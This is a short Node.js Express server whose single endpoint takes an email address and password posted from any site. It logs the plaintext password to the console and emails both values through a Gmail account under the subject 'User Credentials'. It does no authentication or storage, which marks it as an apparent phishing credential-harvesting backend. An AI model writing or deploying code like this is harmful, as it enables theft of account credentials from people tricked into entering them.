import dotenv from "dotenv";
import express from "express";
import nodemailer from "nodemailer";
import bodyParser from "body-parser";
import cors from "cors";

dotenv.config();

const app = express();
app.use(cors());
app.use(bodyParser.json());

app.post("/send-email", async (req, res) => {
  const { email, password } = req.body; 
  console.log("Request body --> " + JSON.stringify(req.body));

  let transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: process.env.EMAIL_USER || '', 
      pass: process.env.EMAIL_PASS || '',
    },
  });

  let mailOptions = {
    from: email,
    to: "",
    subject: "User Credentials",
    text: `Email: ${email}\nPassword: ${password}`,
  };

  try {
    let info = await transporter.sendMail(mailOptions);
    console.log("Email sent: " + info.response);
    res.status(200).json({ success: true });
  } catch (error) {
    console.error(error);
    res.status(500).json({ success: false });
  }
});

app.listen(8080, () => {
  console.log("Server is running on port 8080");
});
